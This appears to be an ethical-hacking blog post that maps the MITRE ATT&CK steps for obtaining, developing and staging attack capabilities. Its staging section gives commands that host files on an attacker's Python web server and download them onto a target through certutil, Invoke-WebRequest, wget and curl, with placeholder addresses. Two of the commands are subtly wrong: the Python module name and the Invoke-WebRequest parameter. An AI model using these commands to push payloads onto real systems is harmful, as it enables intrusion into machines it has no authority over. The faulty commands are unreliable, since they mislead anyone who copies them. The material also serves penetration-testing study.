---
title: Obtain, Develop and Stage Capabilities
categories: [Ethical Hacking Tools,Stage Capabilities]
tags: [stage capabilities (T1608), obtain capabilities (T1588), develop capabilities (T1587), powershell, bash, certutil.exe, python, wget, curl, invoke-webrequest]
comments: true
---

# Overview

Obtaining, Developing and Staging capabilities or resources is an integral part of attack Planning and Reconnaissance. Ensuring that capabilities are setup and configured prior to launching an attack on a target and providing various supporting mechanisms across the different attack phases. Capabilities can include tool deployment, server initialization and configuration, malware creation and resource hosting. 

# [Obtaining Capabilities](https://attack.mitre.org/techniques/T1588)

Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.

## Penetration Testing Suites

There are two main distributions that come pre-packaged with various tools in support of penetration testing activities. A custom environment can also be created to aid in what ever tasks that are planning to be carried out.

[Kali Linux](https://www.kali.org/)
: Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics and Reverse Engineering.

[ParrotOS](https://parrotlinux.org/)
: Parrot Security provides a huge arsenal of tools, utilities and libraries that IT and security professionals can use to test and assess the security of their assets in a reliable, compliant and reproducible way. From information gathering to the final report. The Parrot system gets you covered with the most flexible environment.

# [Developing Capabilities](https://attack.mitre.org/techniques/T1587)

Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.

## Malware Development with MSFvenom

### Sources
- [Offensive Security - Metasploit Unleashed (Msfvenom)](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)

# [Staging Capabilities](https://attack.mitre.org/techniques/T1608)

## Hosting Resources via a Python HTTP Server

Python is able to be used to host a HTTP web server in order to serve resources that can be downloaded remotely via a target system.

1. Create a local folder to host files and resources
2. Open a terminal windows and navigate to the previously created directory
3. Establish a web server using python via the following command, replace `%PORT%` with the desired port to host the server on.

    ```bash
    python3 -m simpleHTTPServer %PORT%
    ```
    {: .nolineno }

### Downloading Hosted Resources

There are various ways to download the resources on a target host via the aforementioned Python HTTP Server. Some of the more common and easier methods are below

**Windows**
1. Certutil.exe

    ```powershell
    certutil.exe -urlcache -f http://%IPADDRESS%:%PORT%/%RESOURCE% %OUTPUT%
    ```
    {: .nolineno }

2. Invoke-WebRequest (Wget)

    ```powershell
    Invoke-WebRequest -Method Get -Url http://%IPADDRESS%:%PORT%/%RESOURCE% -OutFile %OUTPUT%
    ```
    {: .nolineno }

**Linux**
1. Wget

    ```bash
    wget -O %OUTPUT% http://%IPADDRESS%:%PORT%/%RESOURCE%
    ```
    {: .nolineno }

2. Curl

    ```bash
    curl -o %OUTPUT% http://%IPADDRESS%:%PORT%/%RESOURCE%
    ```
    {: .nolineno }